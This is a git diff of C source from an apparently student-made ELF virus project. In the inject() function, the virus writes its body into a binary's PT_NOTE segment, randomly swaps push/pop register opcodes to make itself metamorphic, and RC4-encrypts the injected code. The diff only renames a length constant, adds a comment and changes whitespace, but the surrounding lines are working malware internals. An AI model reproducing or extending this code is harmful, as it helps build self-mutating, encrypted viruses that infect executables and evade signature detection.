@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/04 16:00:11 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/04 16:11:42 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -89,8 +89,7 @@ void		inject(t_data *data)
 
 
 	// step 5.6 : metamorph rc4
-	#define LEN 8
-	uint16_t oc[LEN] = {
+	uint16_t oc[OC_ENTRY] = {
 		0x5850, // rax
 		0x5951, // rcx
 		0x5a52,	// rdx
@@ -98,18 +97,18 @@ void		inject(t_data *data)
 		0x5c54,	// rsp
 		0x5d55, // rbp
 		0x5e56, // rsi
-		0x5f57
+		0x5f57	// rdi
 	};
 
 	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
 	lim = (size_t)end_of_data - (size_t)_rc4;
 	while (lim > 0)
 	{
-	 	for (register int i = 0 ; i < LEN ; i++)
+	 	for (register int i = 0 ; i < OC_ENTRY ; i++)
 		{
 			if (oc[i] == *(uint16_t*)dst)
 			{
-				*(uint16_t*)dst = oc[_random_number(LEN)];
+				*(uint16_t*)dst = oc[_random_number(OC_ENTRY)];
 				dst++;
 				break ;
 			}
@@ -124,7 +123,7 @@ void		inject(t_data *data)
 	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
 	_memcpy(data->cpr_key, dst, KEY_SIZE);
 
-	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
+  	dst = map + (data->virus.note->p_offset + ((size_t)opening - (size_t)start));
 	_rc4((uint8_t*)data->cpr_key, KEY_SIZE, dst, (size_t)_rc4 - (size_t)opening);
 
 
